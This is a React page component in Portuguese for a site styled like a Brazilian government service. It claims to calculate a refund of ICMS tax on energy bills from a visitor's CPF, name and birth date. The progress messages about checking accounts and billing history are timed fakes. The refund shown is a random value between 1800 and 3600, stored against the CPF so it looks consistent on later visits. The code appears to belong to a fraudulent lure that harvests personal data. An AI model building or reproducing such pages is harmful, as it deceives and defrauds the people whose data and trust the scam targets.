import { useEffect, useState } from 'react';
import { useLocation } from 'wouter';
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Progress } from "@/components/ui/progress";

export default function CalculoLoading() {
  const [, setLocation] = useLocation();
  const [message, setMessage] = useState('Estamos calculando sua restituição...');
  const [progresso, setProgresso] = useState(10);
  const [isLoaded, setIsLoaded] = useState(false);
  
  // Recupera parâmetros da URL
  const searchParams = new URLSearchParams(window.location.search);
  const cpf = searchParams.get('cpf') || '';
  const nome = searchParams.get('nome') || '';
  const companhia = searchParams.get('companhia') || '';
  const estado = searchParams.get('estado') || '';
  const dataNascimento = searchParams.get('nasc') || '';
  const valorMedio = searchParams.get('valor') || '';
  const meses = searchParams.get('meses') || '';
  
  // Sequência de mensagens a serem exibidas
  const messages = [
    'Estamos calculando sua restituição...',
    'Verificando os dados da sua conta de energia...',
    'Analisando o histórico de cobranças...',
    'Calculando os valores de ICMS pagos...',
    'Conferindo os valores de restituição disponíveis...',
    'Finalizando seu cálculo...'
  ];
  
  // Efeito que é executado apenas uma vez ao carregar a página
  useEffect(() => {
    // Marca a página como carregada imediatamente para evitar tela branca
    setIsLoaded(true);
    
    let currentIndex = 0;
    let timer: NodeJS.Timeout;
    
    // Função para mostrar mensagens sequencialmente
    const showNextMessage = () => {
      if (currentIndex < messages.length - 1) {
        currentIndex++;
        setMessage(messages[currentIndex]);
        setProgresso((currentIndex + 1) / messages.length * 100);
      } else {
        // Quando terminar as mensagens, redirecionar para o resultado
        clearInterval(timer);
        
        // Realizar consulta à API para obter ou criar um valor no banco de dados
        fetch(`/api/restituicao?cpf=${cpf.replace(/\D/g, '')}`)
          .then(response => response.json())
          .then(data => {
            // Se já existe um valor, usamos ele
            if (data.encontrado && data.valorRestituicao) {
              console.log("Valor encontrado no banco de dados:", data.valorRestituicao);
              
              // Redirecionar para o resultado com todos os dados necessários
              setTimeout(() => {
                setLocation(`/resultado-calculo?cpf=${encodeURIComponent(cpf)}&nome=${encodeURIComponent(nome)}&companhia=${encodeURIComponent(companhia)}&estado=${encodeURIComponent(estado)}&nasc=${encodeURIComponent(dataNascimento)}&valor=${encodeURIComponent(valorMedio)}&meses=${encodeURIComponent(meses)}`);
              }, 1000);
            } else {
              // Se não existe, geramos um valor aleatório e salvamos
              const valorMinimo = 1800;
              const valorMaximo = 3600;
              const valorAleatorio = Math.random() * (valorMaximo - valorMinimo) + valorMinimo;
              const valorFinal = Math.round(valorAleatorio * 100) / 100;
              
              // Salvar o valor calculado no banco de dados
              fetch('/api/restituicao', {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                  cpf: cpf.replace(/\D/g, ''),
                  valor: valorFinal
                }),
              })
              .then(() => {
                console.log("Valor salvo no banco de dados com sucesso");
                
                // Redirecionar para o resultado com todos os dados necessários
                setTimeout(() => {
                  setLocation(`/resultado-calculo?cpf=${encodeURIComponent(cpf)}&nome=${encodeURIComponent(nome)}&companhia=${encodeURIComponent(companhia)}&estado=${encodeURIComponent(estado)}&nasc=${encodeURIComponent(dataNascimento)}&valor=${encodeURIComponent(valorMedio)}&meses=${encodeURIComponent(meses)}`);
                }, 1000);
              })
              .catch(error => {
                console.error("Erro ao salvar valor no banco de dados:", error);
                
                // Mesmo com erro, redirecionamos para o resultado
                setTimeout(() => {
                  setLocation(`/resultado-calculo?cpf=${encodeURIComponent(cpf)}&nome=${encodeURIComponent(nome)}&companhia=${encodeURIComponent(companhia)}&estado=${encodeURIComponent(estado)}&nasc=${encodeURIComponent(dataNascimento)}&valor=${encodeURIComponent(valorMedio)}&meses=${encodeURIComponent(meses)}`);
                }, 1000);
              });
            }
          })
          .catch(error => {
            console.error("Erro ao consultar valor de restituição:", error);
            
            // Mesmo com erro, redirecionamos para o resultado
            setTimeout(() => {
              setLocation(`/resultado-calculo?cpf=${encodeURIComponent(cpf)}&nome=${encodeURIComponent(nome)}&companhia=${encodeURIComponent(companhia)}&estado=${encodeURIComponent(estado)}&nasc=${encodeURIComponent(dataNascimento)}&valor=${encodeURIComponent(valorMedio)}&meses=${encodeURIComponent(meses)}`);
            }, 1000);
          });
      }
    };
    
    // Garantir que a primeira mensagem é exibida imediatamente
    setMessage(messages[0]);
    setProgresso((1 / messages.length) * 100);
    
    // Configurar o temporizador para trocar as mensagens
    timer = setInterval(showNextMessage, 1500);
    
    // Limpar temporizador ao desmontar
    return () => clearInterval(timer);
  }, []);
  
  // Aplicar classe CSS para evitar que o conteúdo seja exibido muito tarde
  // e causar a impressão de tela branca antes do carregamento
  return (
    <div className="min-h-screen flex flex-col">
      <Header />
      
      <main className="flex-1 bg-[#f0f2f5] py-8">
        <div className="container mx-auto px-4">
          <div className="max-w-4xl mx-auto">
            <Card className="shadow-md">
              <CardHeader className="bg-[var(--gov-blue)] text-white text-center py-6">
                <CardTitle className="text-2xl font-bold">Cálculo da Restituição</CardTitle>
                <CardDescription className="text-gray-100 mt-2">
                  Estamos processando os dados para calcular sua restituição
                </CardDescription>
              </CardHeader>
              
              <CardContent className="p-6">
                <div className="text-center py-8">
                  <h3 className="text-lg font-semibold mb-4 text-[var(--gov-blue-dark)]">
                    Verificando seus dados...
                  </h3>
                  <Progress value={progresso} className="h-2 mb-4" />
                  <p className="text-sm text-[var(--gov-gray-dark)] mb-4">
                    Estamos consultando suas informações para verificar o direito à restituição.
                  </p>
                  <p className="text-sm text-[var(--gov-blue-dark)] font-medium animate-pulse">
                    {message}
                  </p>
                </div>
              </CardContent>
            </Card>
          </div>
        </div>
      </main>
      
      <Footer />
    </div>
  );
}